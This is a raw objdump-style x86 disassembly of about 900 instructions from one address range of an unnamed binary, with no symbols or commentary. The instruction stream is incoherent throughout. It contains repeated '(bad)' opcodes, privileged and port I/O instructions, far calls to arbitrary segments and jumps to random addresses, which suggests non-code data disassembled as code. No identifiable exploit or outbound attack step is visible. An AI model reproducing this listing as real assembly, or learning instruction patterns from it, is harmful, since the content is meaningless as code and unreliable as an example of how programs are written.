  41d0d4:	jg     0x41d0b9
  41d0d6:	pusha  
  41d0d7:	sar    edx,cl
  41d0d9:	and    edi,DWORD PTR [ebx+ecx*4+0x11]
  41d0dd:	retf   0xde27
  41d0e0:	cmp    ecx,edx
  41d0e2:	daa    
  41d0e3:	dec    ebx
  41d0e4:	dec    edi
  41d0e5:	adc    esi,DWORD PTR [esi+0xb]
  41d0e8:	xor    DWORD PTR [eax-0x6685fbec],0x32
  41d0ef:	sbb    eax,0x87a8bc9
  41d0f4:	inc    ebp
  41d0f5:	jae    0x41d0cd
  41d0f7:	mov    ecx,0x94ff177d
  41d0fc:	shr    DWORD PTR [esi-0x49b13b2d],1
  41d102:	inc    eax
  41d103:	jg     0x41d0c1
  41d105:	sub    dh,al
  41d107:	xor    BYTE PTR [edx+ebp*8-0x5a],cl
  41d10b:	or     edx,DWORD PTR [esi-0x36]
  41d10e:	test   BYTE PTR [edi],dh
  41d110:	cmp    al,0x7e
  41d112:	mov    dh,0x9a
  41d114:	push   esi
  41d115:	retf   0xe42f
  41d118:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d119:	loope  0x41d0cb
  41d11b:	mov    edi,0xa3ffc031
  41d120:	shl    DWORD PTR [ecx+eax*4],0x80
  41d124:	dec    ecx
  41d125:	or     BYTE PTR [ebp-0x2031c090],dh
  41d12b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d12c:	cmc    
  41d12d:	xor    ecx,ebx
  41d12f:	iret   
  41d130:	enter  0x70eb,0xee
  41d134:	dec    edx
  41d135:	xchg   esi,eax
  41d136:	xor    DWORD PTR [ebp+0x0],edx
  41d139:	stc    
  41d13a:	aas    
  41d13b:	inc    esi
  41d13c:	add    BYTE PTR [ecx],dh
  41d13e:	pop    ecx
  41d13f:	mov    DWORD PTR [esi],ecx
  41d141:	sbb    ch,ch
  41d143:	div    BYTE PTR [ebp+0x683825b3]
  41d149:	inc    ebx
  41d14a:	lock xor al,0x6b
  41d14d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d14e:	ins    BYTE PTR es:[edi],dx
  41d14f:	or     cl,al
  41d151:	xchg   ebp,eax
  41d152:	dec    esi
  41d153:	jecxz  0x41d19a
  41d155:	inc    esi
  41d156:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d157:	jmp    0x41d1b1
  41d159:	je     0x41d1ae
  41d15b:	not    BYTE PTR [edi]
  41d15d:	mov    bh,0x7
  41d15f:	(bad)  
  41d161:	dec    edx
  41d162:	jmp    0x1f87fb0
  41d167:	daa    
  41d168:	jmp    DWORD PTR ss:[ecx+0x9]
  41d16c:	cmp    al,0x55
  41d16e:	in     eax,dx
  41d16f:	jle    0x41d174
  41d171:	xor    esp,ebp
  41d173:	or     DWORD PTR [ecx],0xce910bb2
  41d179:	sahf   
  41d17a:	cs push ecx
  41d17c:	and    ah,ah
  41d17e:	je     0x41d17e
  41d180:	inc    ebx
  41d181:	xlat   BYTE PTR ds:[ebx]
  41d182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d183:	mov    ebp,0x4b790ac2
  41d188:	scas   al,BYTE PTR es:[edi]
  41d189:	ins    BYTE PTR es:[edi],dx
  41d18a:	sbb    DWORD PTR [esi+0x26],0x992f953e
  41d191:	stc    
  41d192:	loope  0x41d1c5
  41d194:	mov    edx,0xa7a0d00e
  41d199:	cmp    BYTE PTR [edx],0x97
  41d19c:	inc    eax
  41d19d:	jno    0x41d135
  41d19f:	sub    al,0x5e
  41d1a1:	mov    dh,0x2a
  41d1a3:	push   esp
  41d1a4:	imul   esi,DWORD PTR ds:0x8d0ac2dd,0xffffffd7
  41d1ab:	jl     0x41d189
  41d1ad:	xor    DWORD PTR ds:0x56895816,esp
  41d1b3:	xlat   BYTE PTR ds:[ebx]
  41d1b4:	mov    ds:0xc149656e,eax
  41d1b9:	pandn  mm1,QWORD PTR [edi]
  41d1bc:	xor    eax,0x8adcd2e4
  41d1c1:	mov    eax,0x70321082
  41d1c6:	call   0x6b735c35
  41d1cb:	lds    ebx,FWORD PTR [ecx+0x67]
  41d1ce:	mov    cl,al
  41d1d0:	ss jp  0x41d1a0
  41d1d3:	outs   dx,BYTE PTR ds:[esi]
  41d1d4:	sub    DWORD PTR [edx],ebp
  41d1d6:	popf   
  41d1d7:	aaa    
  41d1d8:	iret   
  41d1d9:	jnp    0x41d1fc
  41d1db:	mul    DWORD PTR [edx-0x262acfa4]
  41d1e1:	(bad)  
  41d1e2:	jecxz  0x41d250
  41d1e4:	test   DWORD PTR [edi-0x6b],edx
  41d1e7:	cmp    al,dl
  41d1e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1ea:	loopne 0x41d1d9
  41d1ec:	ficom  WORD PTR [eax+edi*2]
  41d1ef:	jl     0x41d1f1
  41d1f1:	mov    cl,0x5c
  41d1f3:	je     0x41d1f1
  41d1f5:	pop    esi
  41d1f6:	cli    
  41d1f7:	inc    edi
  41d1f8:	or     al,0x98
  41d1fa:	push   0x5e
  41d1fc:	dec    ebx
  41d1fd:	or     BYTE PTR [esi-0x778d0606],dh
  41d203:	popf   
  41d204:	jle    0x41d1fd
  41d206:	and    edi,esp
  41d208:	popa   
  41d209:	and    BYTE PTR [ebp+0x4c],al
  41d20c:	or     eax,eax
  41d20e:	and    ebp,edi
  41d210:	adc    eax,0x44530593
  41d215:	push   esp
  41d216:	inc    edi
  41d217:	xor    al,0xd6
  41d219:	imul   eax,esp,0x2b365897
  41d21f:	push   edx
  41d220:	ss pop edi
  41d222:	or     DWORD PTR [ebx+esi*8+0x77528c92],ebx
  41d229:	mov    ds:0x90b7ddff,al
  41d22e:	pop    eax
  41d22f:	mov    al,ds:0xd0ef3093
  41d234:	push   0xa37ce609
  41d239:	jg     0x41d24d
  41d23b:	rcr    ecx,0xe0
  41d23e:	add    ebx,DWORD PTR [edi+0xd]
  41d241:	dec    edx
  41d242:	rcr    bh,1
  41d244:	pop    ds
  41d245:	mov    esp,0x6ffd3d19
  41d24a:	add    bh,bh
  41d24c:	cli    
  41d24d:	(bad)  
  41d24e:	and    eax,0x6d85a018
  41d253:	and    ah,dh
  41d255:	loope  0x41d2b1
  41d257:	jne    0x41d1fa
  41d259:	jae    0x41d1ed
  41d25b:	arpl   WORD PTR [edx-0x62],di
  41d25e:	lock cmp bh,BYTE PTR [edi]
  41d261:	scas   al,BYTE PTR es:[edi]
  41d262:	ret    0x60c2
  41d265:	dec    esp
  41d266:	mov    dh,BYTE PTR fs:[ecx+0x571e60f8]
  41d26d:	sbb    BYTE PTR [ebp+0x8],al
  41d270:	aaa    
  41d271:	cs (bad) 
  41d274:	jle    0x41d2bf
  41d276:	(bad)  
  41d277:	idiv   BYTE PTR [ecx-0x2bb0a3b0]
  41d27d:	pop    esi
  41d27e:	or     DWORD PTR [ecx+0x4],edx
  41d281:	add    ebx,DWORD PTR [edi+0x690ad1e2]
  41d287:	hlt    
  41d288:	lods   al,BYTE PTR ds:[esi]
  41d289:	outs   dx,DWORD PTR ds:[esi]
  41d28a:	test   DWORD PTR ds:0x6cf13e86,edi
  41d290:	ret    
  41d291:	pop    esp
  41d292:	pop    ds
  41d293:	push   ebx
  41d294:	jmp    0x57e73b87
  41d299:	dec    edi
  41d29a:	rcl    BYTE PTR [edx-0x1c],1
  41d29d:	in     al,dx
  41d29e:	xchg   edi,eax
  41d29f:	or     DWORD PTR ds:0x63f61d69,ecx
  41d2a5:	jmp    0x41d2ac
  41d2a7:	aaa    
  41d2a8:	xor    al,BYTE PTR [esi]
  41d2aa:	nop
  41d2ab:	add    eax,0x987079f4
  41d2b0:	sar    bl,1
  41d2b2:	dec    ecx
  41d2b3:	mov    esi,0x9bbc4045
  41d2b8:	inc    edi
  41d2b9:	arpl   WORD PTR [esi-0x702459b7],ax
  41d2bf:	popf   
  41d2c0:	into   
  41d2c1:	push   ss
  41d2c2:	sub    al,0x36
  41d2c4:	sub    bh,BYTE PTR [eax-0xf]
  41d2c7:	adc    eax,0x840ac369
  41d2cc:	pop    eax
  41d2cd:	loop   0x41d280
  41d2cf:	pop    esi
  41d2d0:	inc    ebp
  41d2d1:	add    BYTE PTR fs:[ebp-0x648f692b],ch
  41d2d8:	fbld   TBYTE PTR [ecx]
  41d2da:	mov    esi,0xb2581124
  41d2df:	pop    edi
  41d2e0:	or     al,0x99
  41d2e2:	jmp    0xea31:0x4928af63
  41d2e9:	arpl   WORD PTR [edi-0x44],cx
  41d2ec:	jno    0x41d303
  41d2ee:	mov    eax,0x4e4f15a5
  41d2f3:	inc    esi
  41d2f4:	push   edi
  41d2f5:	or     DWORD PTR [edx+esi*2],0x50
  41d2f9:	mov    al,0x8d
  41d2fb:	inc    eax
  41d2fc:	sahf   
  41d2fd:	mov    dh,0x3a
  41d2ff:	aaa    
  41d300:	lahf   
  41d301:	(bad)  
  41d302:	das    
  41d303:	ror    cl,cl
  41d305:	mov    eax,ds:0x8598dc30
  41d30a:	shl    BYTE PTR [esp+edx*8],1
  41d30d:	and    al,0xdd
  41d30f:	mov    WORD PTR [edi+0x6a],es
  41d312:	mov    ch,0x5e
  41d314:	xchg   edi,eax
  41d315:	adc    ah,BYTE PTR [ecx-0x3b59aed7]
  41d31b:	pop    es
  41d31c:	xchg   edi,eax
  41d31d:	or     DWORD PTR [esi-0x32affabe],edi
  41d323:	(bad)  
  41d324:	mov    edx,0x1aa35fbb
  41d329:	xchg   ecx,eax
  41d32a:	out    dx,al
  41d32b:	adc    al,0xda
  41d32d:	inc    eax
  41d32e:	jns    0x41d31b
  41d330:	mov    cs:0xdbba41ed,al
  41d336:	scas   eax,DWORD PTR es:[edi]
  41d337:	and    DWORD PTR [ebx+0x72],0x84637d1b
  41d33e:	pop    edi
  41d33f:	sbb    dh,bh
  41d341:	retf   0x8591
  41d344:	and    ch,BYTE PTR [edi]
  41d346:	xchg   esp,eax
  41d347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d348:	js     0x41d35a
  41d34a:	add    BYTE PTR [esi],ah
  41d34c:	dec    edi
  41d34d:	pop    ds
  41d34e:	inc    esi
  41d34f:	or     DWORD PTR [ebp+0x27],0xe
  41d353:	pop    ds
  41d354:	fs and al,dl
  41d357:	pop    eax
  41d358:	test   BYTE PTR [edx-0x60],dl
  41d35b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d35c:	xor    al,0xd
  41d35e:	xor    DWORD PTR [eax+ecx*8],esp
  41d361:	bound  ebp,QWORD PTR [ecx]
  41d363:	pusha  
  41d364:	pushf  
  41d365:	pop    ebp
  41d366:	sub    DWORD PTR ds:0x9463b981,esi
  41d36c:	adc    BYTE PTR [esi+esi*8+0x5c],cl
  41d370:	es addr16 je 0x41d37c
  41d374:	sbb    BYTE PTR [esi+edx*4+0x1a],bl
  41d378:	rcr    DWORD PTR [edx],cl
  41d37a:	jns    0x41d3d6
  41d37c:	ret    
  41d37d:	adc    al,0x26
  41d37f:	imul   ebp,esp,0xffffffc6
  41d382:	mov    esp,0x5daff39e
  41d387:	mov    esi,0x388eb387
  41d38c:	or     DWORD PTR [edx],esp
  41d38e:	or     eax,0x651bfe96
  41d393:	sbb    esp,0xffffff94
  41d396:	jecxz  0x41d36e
  41d398:	xchg   ebp,eax
  41d399:	shl    BYTE PTR [ebx],0xf8
  41d39c:	mov    bl,0x2c
  41d39e:	xor    eax,0x5243b750
  41d3a3:	jmp    0x686b:0x1a85560a
  41d3aa:	in     al,0x19
  41d3ac:	loop   0x41d3aa
  41d3ae:	mov    al,ds:0x7ea93ace
  41d3b3:	sbb    BYTE PTR [eax-0x7d3eae3c],ah
  41d3b9:	mov    esp,0x3051a217
  41d3be:	push   ecx
  41d3bf:	inc    edi
  41d3c0:	aad    0xab
  41d3c2:	daa    
  41d3c3:	push   edi
  41d3c4:	adc    eax,0x7cf5db3
  41d3c9:	mov    DWORD PTR [esi],0x5e02304e
  41d3cf:	(bad)  
  41d3d1:	jbe    0x41d3e9
  41d3d3:	test   eax,0xef34fe9a
  41d3d8:	pushf  
  41d3d9:	add    ebp,DWORD PTR [esi+0x73]
  41d3dc:	cmp    eax,0x5a93a4e
  41d3e1:	push   cs
  41d3e2:	push   ebp
  41d3e3:	addr16 push eax
  41d3e5:	(bad)  
  41d3e7:	push   edi
  41d3e8:	adc    eax,0x37acffd6
  41d3ed:	repz push ss
  41d3ef:	pop    esp
  41d3f0:	push   esp
  41d3f1:	mov    edx,0xe940c649
  41d3f6:	xchg   edi,eax
  41d3f7:	data16 js 0x41d399
  41d3fa:	adc    dl,BYTE PTR [edx]
  41d3fc:	icebp  
  41d3fd:	push   esp
  41d3fe:	cmp    DWORD PTR [edx-0x30],esp
  41d401:	repz and eax,0x5ecdee9d
  41d407:	fs lock (bad) 
  41d40a:	pop    ebp
  41d40b:	push   0x72f3254c
  41d410:	call   0x5c8f2654
  41d415:	test   BYTE PTR [eax+esi*4-0x68e351e8],ah
  41d41c:	sahf   
  41d41d:	jl     0x41d3f0
  41d41f:	lods   al,BYTE PTR ds:[esi]
  41d420:	inc    ecx
  41d421:	shr    DWORD PTR [ecx+ebp*2],0xf6
  41d425:	nop
  41d426:	inc    esp
  41d427:	or     al,al
  41d429:	jmp    0xdf9dd4cb
  41d42e:	xlat   BYTE PTR ds:[ebx]
  41d42f:	xor    al,0x3f
  41d431:	pop    ss
  41d432:	mov    esp,0x2147b509
  41d437:	sbb    BYTE PTR [edi],dl
  41d439:	xchg   ebx,eax
  41d43a:	pop    eax
  41d43b:	xchg   edx,eax
  41d43c:	sbb    BYTE PTR ss:[eax-0x4a22ae03],bh
  41d443:	and    eax,0xd407a609
  41d448:	lods   al,BYTE PTR ds:[esi]
  41d449:	fldenv [ebx]
  41d44b:	fiadd  WORD PTR [ebx+0x6b203db9]
  41d451:	or     al,0xb8
  41d453:	out    0xa,al
  41d455:	loop   0x41d4a0
  41d457:	pop    ebp
  41d458:	pop    edx
  41d459:	repnz pusha 
  41d45b:	cli    
  41d45c:	fsqrt  
  41d45e:	or     ch,BYTE PTR [ecx-0x33a41443]
  41d464:	mov    ecx,0xf90e2637
  41d469:	push   es
  41d46a:	mov    al,0x10
  41d46c:	lea    esi,[ecx]
  41d46e:	inc    eax
  41d46f:	sbb    al,0x50
  41d471:	imul   DWORD PTR [ebx]
  41d473:	clc    
  41d474:	mov    ds:0x5d3f166f,eax
  41d479:	je     0x41d4cc
  41d47b:	mov    BYTE PTR [ebx+ebp*8+0x1bf83f52],bl
  41d482:	fldcw  WORD PTR [edx+ebx*1]
  41d485:	inc    eax
  41d486:	dec    ecx
  41d487:	push   ds
  41d488:	call   0xbbb381bb
  41d48d:	cld    
  41d48e:	and    ah,bl
  41d490:	outs   dx,DWORD PTR ds:[esi]
  41d491:	lahf   
  41d492:	mov    dh,0x2d
  41d494:	bound  ebp,QWORD PTR [ecx]
  41d496:	imul   edi,edx,0xbc025f8e
  41d49c:	ret    0x6a37
  41d49f:	cmp    BYTE PTR ds:0x6262019e,al
  41d4a5:	mov    bh,0x46
  41d4a7:	mov    ecx,esp
  41d4a9:	jbe    0x41d434
  41d4ab:	cmp    eax,0x3f533c03
  41d4b0:	pop    esp
  41d4b1:	outs   dx,DWORD PTR ds:[esi]
  41d4b2:	imul   ebx,DWORD PTR [edx-0x2e77d476],0x75
  41d4b9:	int    0x31
  41d4bb:	mov    ch,0xce
  41d4bd:	sbb    ch,cl
  41d4bf:	das    
  41d4c0:	scas   al,BYTE PTR es:[edi]
  41d4c1:	arpl   WORD PTR [edx+edx*8],si
  41d4c4:	dec    ecx
  41d4c5:	mov    ebp,0x2956399d
  41d4ca:	retf   0x94de
  41d4cd:	mov    BYTE PTR [edx+0x79],cl
  41d4d0:	fnstenv [eax]
  41d4d2:	push   ebx
  41d4d3:	ret    
  41d4d4:	int3   
  41d4d5:	dec    ecx
  41d4d6:	dec    ebx
  41d4d7:	lds    ecx,FWORD PTR [edx+0x57]
  41d4da:	jg     0x41d522
  41d4dc:	and    cl,BYTE PTR [ecx]
  41d4de:	sbb    al,0x18
  41d4e0:	push   ds
  41d4e1:	jge    0x41d4d1
  41d4e3:	adc    esp,DWORD PTR [edx-0x74]
  41d4e6:	imul   dl
  41d4e8:	add    esp,DWORD PTR [ebp+0x27c0ae19]
  41d4ee:	xchg   esp,eax
  41d4ef:	retf   
  41d4f0:	cdq    
  41d4f1:	xor    al,0x52
  41d4f3:	push   ss
  41d4f4:	add    BYTE PTR [ecx-0x52],al
  41d4f7:	adc    DWORD PTR [eax],edi
  41d4f9:	fld    st(5)
  41d4fb:	out    dx,eax
  41d4fc:	pop    ds
  41d4fd:	and    BYTE PTR [edi],al
  41d4ff:	ss push eax
  41d501:	inc    ebp
  41d502:	add    BYTE PTR [ecx+ecx*8-0x798dfce7],0x8b
  41d50a:	test   ebp,0x99d9f4f4
  41d510:	xchg   edx,eax
  41d511:	jmp    0x41d4ef
  41d513:	sub    edx,edx
  41d515:	or     eax,0xa3504805
  41d51a:	rcl    DWORD PTR ds:0xe51e3c04,0x3b
  41d521:	mov    esi,0x5a859e2a
  41d526:	jp     0x41d581
  41d528:	mov    ecx,0xf2800dbd
  41d52d:	rcr    DWORD PTR [esi+0x170f8c1c],1
  41d533:	and    BYTE PTR [ebp+0x4149b],bh
  41d539:	loopne 0x41d4d9
  41d53b:	imul   edi,DWORD PTR [ebx+0x72],0xe4e99ed
  41d542:	mov    bh,0xe
  41d544:	push   ss
  41d545:	mov    dl,0x2f
  41d547:	lods   al,BYTE PTR ds:[esi]
  41d548:	ss push esp
  41d54a:	cmp    ebx,ebp
  41d54c:	mov    cs,WORD PTR [ebp-0x28]
  41d54f:	call   DWORD PTR [eax+0x52c2a08f]
  41d555:	popf   
  41d556:	sub    al,0xa7
  41d558:	in     al,dx
  41d559:	cdq    
  41d55a:	adc    ch,BYTE PTR ds:0x9f90d46f
  41d560:	pop    ebp
  41d561:	daa    
  41d562:	adc    bl,dh
  41d564:	jge    0x41d5ba
  41d566:	dec    esi
  41d567:	sbb    al,0x64
  41d569:	adc    eax,0x179c1d68
  41d56e:	pop    edx
  41d56f:	push   eax
  41d570:	lahf   
  41d571:	fldenv ds:0x686ab75e
  41d577:	in     al,dx
  41d578:	repz cld 
  41d57a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d57b:	cwde   
  41d57c:	and    eax,0x72dee4b5
  41d581:	sahf   
  41d582:	jl     0x41d53a
  41d584:	adc    al,0xdc
  41d586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d587:	or     eax,0x5903cf28
  41d58c:	or     eax,0x7c515aaa
  41d591:	jnp    0x41d5c9
  41d593:	push   ss
  41d594:	out    dx,eax
  41d595:	dec    BYTE PTR [esi]
  41d597:	dec    ebx
  41d598:	mov    bh,BYTE PTR [ecx+0x120a8496]
  41d59e:	mov    ecx,0xbfb0a300
  41d5a3:	dec    ecx
  41d5a4:	inc    ebx
  41d5a5:	out    0x5e,eax
  41d5a7:	(bad)  
  41d5a8:	sar    DWORD PTR [ecx+eax*8+0x10],0xb4
  41d5ad:	adc    eax,0x14063d17
  41d5b2:	cwde   
  41d5b3:	lods   al,BYTE PTR ds:[esi]
  41d5b4:	dec    ebx
  41d5b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5b6:	(bad)  
  41d5b7:	iret   
  41d5b8:	or     ch,al
  41d5ba:	rol    bl,0x7c
  41d5bd:	inc    ebx
  41d5be:	sbb    cl,BYTE PTR [eax]
  41d5c0:	pop    esi
  41d5c1:	jle    0x41d547
  41d5c3:	mov    ah,0x4a
  41d5c5:	cmp    eax,0x430c62f7
  41d5ca:	inc    edx
  41d5cb:	push   es
  41d5cc:	push   ebx
  41d5cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5ce:	pop    edx
  41d5cf:	and    eax,0xc635f8e6
  41d5d4:	mov    cl,0xf2
  41d5d6:	xchg   esi,eax
  41d5d7:	add    al,0x62
  41d5d9:	xchg   esi,eax
  41d5da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5db:	mov    al,0xf4
  41d5dd:	jns    0x41d58a
  41d5df:	sbb    DWORD PTR ds:0x54dc6811,esi
  41d5e5:	(bad)
  41d5e8:	pop    edi
  41d5e9:	lahf   
  41d5ea:	nop
  41d5eb:	lahf   
  41d5ec:	mov    esp,0x5ded8f70
  41d5f1:	neg    DWORD PTR [esi]
  41d5f3:	xchg   DWORD PTR [esi+esi*2],ebx
  41d5f6:	bound  ebx,QWORD PTR [ecx-0x17]
  41d5f9:	fmul   QWORD PTR [edi]
  41d5fb:	ret    
  41d5fc:	mov    gs,WORD PTR [edi]
  41d5fe:	stc    
  41d5ff:	nop
  41d600:	push   ecx
  41d601:	outs   dx,DWORD PTR ds:[esi]
  41d602:	mov    dl,0xf8
  41d604:	sub    DWORD PTR [edi-0x24eb7a57],esi
  41d60a:	jnp    0x41d626
  41d60c:	or     edx,DWORD PTR [eax-0x1d159ce0]
  41d612:	addr16 xchg ah,dh
  41d615:	pushf  
  41d616:	enter  0x51e,0xa8
  41d61a:	aaa    
  41d61b:	fmul   DWORD PTR [esi+eiz*4-0x67]
  41d61f:	dec    ebp
  41d620:	les    ebx,FWORD PTR cs:0x5170385b
  41d627:	and    esi,ebp
  41d629:	jb     0x41d638
  41d62b:	fcomp  DWORD PTR [edx+edx*2]
  41d62e:	stc    
  41d62f:	xchg   DWORD PTR [esi],edx
  41d631:	pop    edi
  41d632:	xchg   ebx,eax
  41d633:	arpl   ax,sp
  41d635:	push   edx
  41d636:	dec    eax
  41d637:	push   esi
  41d638:	xchg   ecx,eax
  41d639:	jg     0x41d654
  41d63b:	cmc    
  41d63c:	push   es
  41d63d:	adc    DWORD PTR ds:0xa5523da2,ebx
  41d643:	ret    0xe8e4
  41d646:	push   ss
  41d647:	clc    
  41d648:	fist   DWORD PTR [eax+0x73]
  41d64b:	or     al,0xe9
  41d64d:	lahf   
  41d64e:	dec    ecx
  41d64f:	sar    DWORD PTR [ecx],0xbf
  41d652:	and    esp,edx
  41d654:	dec    eax
  41d655:	adc    al,0xde
  41d657:	bound  ecx,QWORD PTR [esp+ebp*4]
  41d65a:	xchg   ebp,eax
  41d65b:	(bad)  [edi]
  41d65d:	cs cld 
  41d65f:	adc    BYTE PTR [eax],0xba
  41d662:	ror    eax,cl
  41d664:	nop
  41d665:	iret   
  41d666:	int3   
  41d667:	mov    cl,BYTE PTR [esi]
  41d669:	mov    cl,BYTE PTR [eax+esi*2]
  41d66c:	dec    esp
  41d66d:	fiadd  WORD PTR [ecx-0x7da0935e]
  41d673:	sub    BYTE PTR [ecx-0x6e],dl
  41d676:	call   0x2626:0xe686e218
  41d67d:	dec    eax
  41d67e:	dec    eax
  41d67f:	ror    DWORD PTR [ebx],cl
  41d681:	dec    ebp
  41d682:	int    0x4d
  41d684:	imul   esp,DWORD PTR [ebp-0x369a8a51],0xa67d7e0
  41d68e:	xchg   ecx,eax
  41d68f:	(bad)  
  41d691:	pop    ebp
  41d693:	inc    ebp
  41d694:	xor    BYTE PTR ds:0xc66b162a,dh
  41d69a:	outs   dx,BYTE PTR ds:[esi]
  41d69b:	fucom  st(7)
  41d69d:	sar    eax,0xd2
  41d6a0:	sub    DWORD PTR [si+0x22c2],ecx
  41d6a5:	daa    
  41d6a6:	ret    0xf96
  41d6a9:	in     eax,0x41
  41d6ab:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d6ad:	mov    eax,0xefb41696
  41d6b2:	stos   BYTE PTR es:[edi],al
  41d6b3:	mov    edx,DWORD PTR [eax-0x4dfa82f3]
  41d6b9:	pop    eax
  41d6ba:	or     BYTE PTR [edx],bl
  41d6bc:	sub    dh,ah
  41d6be:	retf   
  41d6bf:	sbb    ecx,esp
  41d6c1:	cdq    
  41d6c2:	xor    eax,0xd8ef2603
  41d6c7:	sub    BYTE PTR [edi+0x457e2a03],cl
  41d6cd:	adc    BYTE PTR [ecx-0x11],dh
  41d6d0:	cmp    bh,bl
  41d6d2:	mov    al,0x35
  41d6d4:	je     0x41d706
  41d6d6:	cwde   
  41d6d7:	sub    eax,0xf8d733b4
  41d6dc:	sub    eax,0x8066dc9b
  41d6e1:	repz cmp eax,0x29e0081e
  41d6e7:	loope  0x41d70f
  41d6e9:	ins    DWORD PTR es:[edi],dx
  41d6ea:	fild   DWORD PTR [ecx+0x424ccf5e]
  41d6f0:	loop   0x41d6d7
  41d6f2:	push   es
  41d6f3:	sub    eax,0xf5535f53
  41d6f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6f9:	les    esi,FWORD PTR [esi+0xc]
  41d6fc:	(bad)  
  41d6fd:	adc    DWORD PTR [eax],esi
  41d6ff:	lock inc ebx
  41d701:	sbb    DWORD PTR [edx-0x5fe23822],esp
  41d707:	push   ds
  41d708:	xor    eax,0x96b08a92
  41d70d:	push   ss
  41d70e:	js     0x41d721
  41d710:	sbb    BYTE PTR [edi],bl
  41d712:	xchg   ebp,eax
  41d713:	pop    edx
  41d714:	ror    al,0x30
  41d717:	hlt    
  41d718:	push   0xfffffffd
  41d71a:	in     eax,dx
  41d71b:	retf   
  41d71c:	add    BYTE PTR [edi-0xf],cl
  41d71f:	add    ebp,DWORD PTR ds:[esi+0x4f]
  41d723:	pop    ecx
  41d724:	xor    DWORD PTR [eax],eax
  41d726:	fsub   QWORD PTR [edx]
  41d728:	or     BYTE PTR [eax],0xf5
  41d72b:	jle    0x41d74b
  41d72d:	call   0x37e2:0x1a8253e3
  41d734:	push   ecx
  41d735:	push   DWORD PTR [edi-0x20f40053]
  41d73b:	mov    DWORD PTR [esi+0x29],esi
  41d73e:	xor    dh,BYTE PTR [eax+0x6d65e777]
  41d744:	inc    edx
  41d745:	pop    ebx
  41d746:	das    
  41d747:	sar    DWORD PTR [ecx+0x120eaf01],1
  41d74d:	mov    cl,0x16
  41d74f:	dec    ecx
  41d750:	call   0x9ab5:0xf257faca
  41d757:	xor    ecx,ebx
  41d759:	das    
  41d75a:	aas    
  41d75b:	xchg   ebx,eax
  41d75c:	fistp  DWORD PTR [edi-0x12]
  41d75f:	out    dx,al
  41d760:	adc    ebx,DWORD PTR [edx+0x3718cd63]
  41d766:	dec    edi
  41d767:	add    al,bl
  41d769:	pop    ebp
  41d76a:	adc    al,0xc
  41d76c:	mov    ds:0x249ce7a8,eax
  41d771:	push   0xffffffab
  41d773:	mov    bh,BYTE PTR [ecx-0x2b]
  41d776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d777:	shl    DWORD PTR [eax-0x5e54accb],0xa3
  41d77e:	fwait
  41d77f:	test   BYTE PTR [ecx+0x7c773e46],al
  41d785:	enter  0xa07a,0xbb
  41d789:	and    eax,0x5998a2be
  41d78e:	je     0x41d75a
  41d790:	scas   eax,DWORD PTR es:[edi]
  41d791:	jl     0x41d768
  41d793:	popf   
  41d794:	and    al,0xc2
  41d796:	push   eax
  41d797:	pop    ebx
  41d798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d799:	stos   BYTE PTR es:[edi],al
  41d79a:	call   0xc2f6:0x2e01a088
  41d7a1:	sub    DWORD PTR [eax],esp
  41d7a3:	push   cs
  41d7a4:	ss ret 0x38b4
  41d7a8:	sar    ebx,cl
  41d7aa:	mov    edi,0x584429fd
  41d7af:	les    edx,FWORD PTR [edx+0x7caca986]
  41d7b5:	inc    ecx
  41d7b6:	call   0x228f:0x51853f66
  41d7bd:	mov    edi,ecx
  41d7bf:	rol    DWORD PTR [ebx+0x19],1
  41d7c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c3:	js     0x41d7d3
  41d7c5:	js     0x41d7b1
  41d7c7:	lock lock push esp
  41d7ca:	add    dh,BYTE PTR [eax-0x387ac638]
  41d7d0:	push   ecx
  41d7d1:	mov    gs,esp
  41d7d3:	and    eax,0xf077df81
  41d7d8:	pop    esi
  41d7d9:	inc    esi
  41d7da:	(bad)  
  41d7db:	jp     0x41d7bf
  41d7dd:	sar    DWORD PTR [ebp+0x285532ed],cl
  41d7e3:	jl     0x41d7ad
  41d7e5:	and    al,BYTE PTR gs:[ebx]
  41d7e8:	sbb    eax,0xc67c91b0
  41d7ed:	mov    esi,0xb54ad483
  41d7f2:	xchg   dh,dh
  41d7f4:	scas   al,BYTE PTR es:[edi]
  41d7f5:	jbe    0x41d850
  41d7f7:	cmc    
  41d7f8:	or     DWORD PTR [esp+eax*4],0x34
  41d7fc:	xchg   edx,eax
  41d7fd:	sti    
  41d7fe:	mov    BYTE PTR [edx-0x106ca53d],ch
  41d804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d805:	xchg   DWORD PTR [esi+0x2f],ecx
  41d808:	leave  
  41d809:	jp     0x41d86d
  41d80b:	out    0xf9,eax
  41d80d:	mov    al,BYTE PTR [esi]
  41d80f:	jmp    0x77b5cdc9
  41d814:	jmp    0xc53c8586
  41d819:	jns    0x41d836
  41d81b:	lock pop eax
  41d81d:	push   ds
  41d81e:	aaa    
  41d81f:	and    esi,ecx
  41d821:	arpl   WORD PTR [ebx],bp
  41d823:	fiadd  WORD PTR [esp+eax*2]
  41d826:	fild   WORD PTR es:[ecx]
  41d829:	jmp    0x7829f679
  41d82e:	cmp    bl,BYTE PTR [eax]
  41d830:	mov    edi,0x67d41a20
  41d835:	mov    ebp,0xbc05ecf
  41d83a:	sub    BYTE PTR [esi+0xa],al
  41d83d:	inc    edx
  41d83e:	stc    
  41d83f:	xor    cl,BYTE PTR [esi+0x5f197002]
  41d845:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
